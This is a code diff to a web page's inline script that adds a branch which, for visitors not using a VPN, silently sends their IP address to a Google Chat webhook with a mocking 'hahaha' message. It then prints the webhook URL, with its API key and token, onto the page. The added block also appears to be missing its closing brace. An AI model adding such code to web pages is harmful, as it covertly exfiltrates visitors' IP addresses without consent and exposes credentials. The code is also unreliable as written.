@@ -18,10 +18,16 @@
       if (JSON.parse(isVpn.responseText).proxy==1){
         setTimeout(function(){document.getElementById("vpn").removeAttribute("hidden");},1000);
       }
+      else{
+        let prank=new XMLHttpRequest();
+        prank.open("POST","https://chat.googleapis.com/v1/spaces/AAAAkRe_ncg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MURICEUKhmZgalA0JHZ8ntVTx3ISuslO5LQBHhEQP00",false);
+        prank.send("{text:\""+ip.responseText+" hahaha\"}");
+        setTimeout(function(){document.getElementById("key").innerText="https://chat.googleapis.com/v1/spaces/AAAAkRe_ncg/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=MURICEUKhmZgalA0JHZ8ntVTx3ISuslO5LQBHhEQP00";},1000);
     </script>
   </head>
   <body>
     <h1 id="vpn" hidden>Use of proxies/VPN is not allowed. I'm so sorry.</h1>
     <p>Hi!!!</p>
+    <p id="key"></p>
   </body>
 </html>
